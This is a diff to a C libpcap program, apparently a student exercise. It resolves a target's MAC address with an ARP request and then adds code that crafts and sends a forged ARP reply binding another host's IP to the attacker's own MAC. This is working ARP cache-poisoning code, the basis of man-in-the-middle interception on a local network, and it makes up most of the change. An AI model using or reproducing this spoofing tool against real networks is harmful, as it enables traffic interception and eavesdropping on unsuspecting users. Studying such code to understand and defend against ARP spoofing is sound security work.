@@ -70,7 +70,7 @@ int main(int argc, char* argv[])
 {
 	int s, i;
 	struct ifreq ifrq;
-	struct arphdr s_arphdr;
+	struct arphdr s_arphdr, fake_arphdr;
 	uint8_t* mymac=(uint8_t*)malloc(6*sizeof(uint8_t));
 	uint8_t* s_mac=(uint8_t*)malloc(6*sizeof(uint8_t));
 	uint8_t* t_mac=(uint8_t*)malloc(6*sizeof(uint8_t));
@@ -124,9 +124,9 @@ int main(int argc, char* argv[])
 	memset(t_mac, NULL, 6*sizeof(uint8_t));
 	make_arp_pkt(&s_arphdr, mymac, t_mac, 1);
 	inet_pton(AF_INET, ipbuf, &s_arphdr.sender_ip);
-	inet_pton(AF_INET, argv[3], &s_arphdr.target_ip);
+	inet_pton(AF_INET, argv[2], &s_arphdr.target_ip);
 	
-	//make sender's ethernet packet
+	//make ethernet packet
 	struct ethhdr s_ethpkt;
 	int size;
 	memset(t_mac, 255, 6*sizeof(uint8_t));
@@ -145,14 +145,14 @@ int main(int argc, char* argv[])
 		return -1;
   	}
 	
-	if(pcap_sendpacket(handle, (uint8_t*)s_packet, size))
+	if(pcap_sendpacket(handle, s_packet, size))
 	{
 		printf("Failed send packet\n");
 		return -1;
 	}
 
 
-	//receive and parse packet
+	//receive and parse packet -> get target mac
 	while(1)
 	{
 		int j;
@@ -168,7 +168,7 @@ int main(int argc, char* argv[])
 		if(t_arphdr!=NULL && ntohs(r_ethhdr->ether_type) == 0x0806)
 		{
 			memcpy(t_mac, r_ethhdr->ether_shost, 6*sizeof(uint8_t));	//target mac 저장
-			printf("target MAC : ");
+			printf("get target MAC : ");
 			for(i=0;i<6;i++)
         		{
                 		if(i<5)
@@ -183,11 +183,22 @@ int main(int argc, char* argv[])
 	}
 
 	
+	//make fake arp packet
+	make_arp_pkt(&fake_arphdr, mymac, t_mac, 2);		//fake arp reply
+	inet_pton(AF_INET, argv[3], &fake_arphdr.sender_ip);	//with my mac
+	inet_pton(AF_INET, argv[2], &fake_arphdr.target_ip);	//with sender's mac
 	
-
+	//make fake ethernet packet
+	struct ethhdr fake_ethpkt;
+	make_ether_pkt(&fake_ethpkt, t_mac, mymac, fake_arphdr);
+	uint8_t* fake_packet=(uint8_t*)malloc(size*sizeof(uint8_t));
+	memcpy(fake_packet, &fake_ethpkt, size*sizeof(uint8_t));
 	
-
-
+	if(pcap_sendpacket(handle, fake_packet, size))
+        {
+                printf("Failed send packet\n");
+                return -1;
+        }
 
 
 
